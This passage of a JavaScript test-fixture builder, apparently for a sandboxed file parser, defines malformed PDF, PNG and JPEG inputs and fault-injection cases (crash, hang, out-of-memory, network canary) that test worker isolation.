  list.push(fixture("malformed-utf16-text-declared-pdf", "malformed", Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from("%PDF-1.4 not really", "utf16le")])));
  list.push(fixture("malformed-kids-dangling-reference", "malformed", simplePdf({ kidsOverride: [99] }), { stage: "parser" }));
  list.push(fixture("malformed-png-bad-crc", "malformed", buildPng({ width: 10, height: 10, corruptCrc: true }), { declaredMime: "image/png" }));
  list.push(fixture("malformed-png-truncated", "malformed", buildPng({ width: 50, height: 50, truncateAt: 40 }), { declaredMime: "image/png" }));
  list.push(fixture("malformed-png-zero-width", "malformed", buildPng({ width: 4, height: 4, ihdrOverride: { width: 0, height: 4 } }), { declaredMime: "image/png" }));
  list.push(fixture("malformed-png-missing-iend", "malformed", buildPng({ width: 4, height: 4, omitIend: true }), { declaredMime: "image/png" }));
  list.push(fixture("malformed-jpeg-no-sof", "malformed", buildJpeg({ width: 8, height: 8, omitSof: true }), { declaredMime: "image/jpeg" }));
  list.push(fixture("malformed-jpeg-truncated", "malformed", buildJpeg({ width: 8, height: 8, omitEoi: true }), { declaredMime: "image/jpeg" }));
  list.push(fixture("malformed-jpeg-zero-height", "malformed", buildJpeg({ width: 8, height: 0 }), { declaredMime: "image/jpeg" }));

  // ---------- fault injection (worker 격리 증명) ----------
  list.push(fixture("fault-crash-abort", "fault", benignPdf, { fault: "crash", wallMs: FAULT_WALL_MS }));
  list.push(fixture("fault-hang-wall-timeout", "fault", benignPdf, { fault: "hang", wallMs: FAULT_WALL_MS }));
  list.push(fixture("fault-oom-heap-limit", "fault", benignPdf, { fault: "oom", wallMs: 60_000 }));
  list.push(fixture("fault-exit-nonzero", "fault", benignPdf, { fault: "exit-nonzero", wallMs: FAULT_WALL_MS }));
  list.push(fixture("fault-stdout-garbage", "fault", benignPdf, { fault: "garbage", wallMs: FAULT_WALL_MS }));
  list.push(fixture("fault-network-canary", "fault", benignPdf, { fault: "network-canary", wallMs: 15_000 }));

  const names = new Set();
  for (const item of list) {
    if (names.has(item.name)) throw new Error(`fixture 이름 중복: ${item.name}`);
    names.add(item.name);
  }
  return list;
};

export const fixtureDigests = () => Object.fromEntries(buildFixtures().map((f) => [f.name, f.sha256]));
